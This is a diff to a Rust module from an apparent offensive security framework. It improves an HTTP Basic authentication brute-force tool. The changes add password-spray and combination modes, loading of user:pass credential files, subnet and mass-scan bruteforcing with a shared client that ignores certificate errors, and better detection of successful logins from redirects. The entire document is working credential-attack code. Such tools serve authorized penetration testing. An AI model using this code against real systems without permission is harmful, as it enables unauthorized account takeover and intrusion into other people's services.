@@ -2,6 +2,7 @@ use anyhow::{anyhow, Result};
 use colored::*;
 use std::io::Write;
 use std::net::IpAddr;
+use std::sync::Arc;
 use std::time::Duration;
 
 use crate::utils::{
@@ -11,7 +12,8 @@ use crate::utils::{
 };
 use crate::modules::creds::utils::{
     BruteforceConfig, LoginResult, SubnetScanConfig,
-    generate_combos, run_bruteforce, run_subnet_bruteforce,
+    generate_combos_mode, parse_combo_mode, load_credential_file,
+    run_bruteforce, run_subnet_bruteforce,
     is_subnet_target, is_mass_scan_target, run_mass_scan, MassScanConfig,
 };
 
@@ -237,19 +239,28 @@ pub async fn run(target: &str) -> Result<()> {
         let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
         let output_file = cfg_prompt_output_file("output_file", "Output result file", "http_basic_subnet_results.txt").await?;
 
+        let subnet_client = Arc::new(reqwest::Client::builder()
+            .danger_accept_invalid_certs(true)
+            .redirect(reqwest::redirect::Policy::none())
+            .timeout(Duration::from_secs(5))
+            .build()
+            .map_err(|e| anyhow!("Failed to build HTTP client: {}", e))?);
+
         return run_subnet_bruteforce(target, port, users, passes, &SubnetScanConfig {
             concurrency,
             verbose,
             output_file,
             service_name: "http-basic",
+            jitter_ms: 0,
             source_module: "creds/generic/http_basic_bruteforce",
             skip_tcp_check: false,
         }, move |ip: IpAddr, port: u16, user: String, pass: String| {
             let url_path = url_path.clone();
+            let client = Arc::clone(&subnet_client);
             async move {
                 let scheme = if use_https { "https" } else { "http" };
                 let url = format!("{}://{}:{}{}", scheme, ip, port, url_path);
-                match try_http_login(&url, &user, &pass, Duration::from_secs(5)).await {
+                match try_http_login(&client, &url, &user, &pass).await {
                     Ok(true) => LoginResult::Success,
                     Ok(false) => LoginResult::AuthFailed,
                     Err(e) => {
@@ -304,7 +315,7 @@ pub async fn run(target: &str) -> Result<()> {
         None
     };
     let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
-    let combo_mode = cfg_prompt_yes_no("combo_mode", "Combination mode? (try every pass with every user)", false).await?;
+    let combo_input = cfg_prompt_default("combo_mode", "Combo mode (linear/combo/spray)", "combo").await?;
 
     let scheme = if use_https { "https" } else { "http" };
     let base_url = format!("{}://{}:{}{}", scheme, target, port, url_path);
@@ -354,14 +365,24 @@ pub async fn run(target: &str) -> Result<()> {
         return Err(anyhow!("No passwords available"));
     }
 
-    let combos = generate_combos(&usernames, &passwords, combo_mode);
-    let timeout_duration = Duration::from_secs(connection_timeout);
+    let mut combos = generate_combos_mode(&usernames, &passwords, parse_combo_mode(&combo_input));
+    if cfg_prompt_yes_no("cred_file", "Load additional user:pass combos from file?", false).await? {
+        let cred_path = cfg_prompt_existing_file("cred_file_path", "Credential file (user:pass per line)").await?;
+        combos.extend(load_credential_file(&cred_path)?);
+    }
+
+    let shared_client = Arc::new(reqwest::Client::builder()
+        .danger_accept_invalid_certs(true)
+        .redirect(reqwest::redirect::Policy::none())
+        .timeout(Duration::from_secs(connection_timeout))
+        .build()
+        .map_err(|e| anyhow!("Failed to build HTTP client: {}", e))?);
 
     let try_login = move |_t: String, _p: u16, user: String, pass: String| {
         let url = base_url.clone();
-        let timeout_dur = timeout_duration;
+        let client = Arc::clone(&shared_client);
         async move {
-            match try_http_login(&url, &user, &pass, timeout_dur).await {
+            match try_http_login(&client, &url, &user, &pass).await {
                 Ok(true) => LoginResult::Success,
                 Ok(false) => LoginResult::AuthFailed,
                 Err(e) => {
@@ -384,6 +405,7 @@ pub async fn run(target: &str) -> Result<()> {
         delay_ms: 0,
         max_retries,
         service_name: "http-basic",
+        jitter_ms: 0,
         source_module: "creds/generic/http_basic_bruteforce",
     }, combos, try_login).await?;
 
@@ -456,17 +478,11 @@ pub async fn run(target: &str) -> Result<()> {
 /// Returns Ok(true) on 200 (success), Ok(false) on 401/403 (auth failed),
 /// Err on connection/protocol errors.
 async fn try_http_login(
+    client: &reqwest::Client,
     url: &str,
     user: &str,
     pass: &str,
-    timeout_duration: Duration,
 ) -> Result<bool> {
-    let client = reqwest::Client::builder()
-        .danger_accept_invalid_certs(true)
-        .timeout(timeout_duration)
-        .build()
-        .map_err(|e| anyhow!("Failed to build HTTP client: {}", e))?;
-
     let response = client
         .get(url)
         .basic_auth(user, Some(pass))
@@ -478,7 +494,19 @@ async fn try_http_login(
     match status {
         200..=299 => Ok(true),
         401 | 403 => Ok(false),
-        301 | 302 | 303 | 307 | 308 => Ok(true), // Redirect after auth = success
+        301 | 302 | 303 | 307 | 308 => {
+            // Only count redirect as success if it doesn't point to a login/auth page
+            if let Some(location) = response.headers().get("location") {
+                let loc = location.to_str().unwrap_or("").to_lowercase();
+                if loc.contains("login") || loc.contains("auth") || loc.contains("signin") || loc.contains("sso") {
+                    Ok(false) // Redirect to login page = auth failed
+                } else {
+                    Ok(true) // Redirect to non-login page = likely success
+                }
+            } else {
+                Ok(true) // No location header = treat as success
+            }
+        }
         _ => Err(anyhow!("HTTP {}", status)),
     }
 }
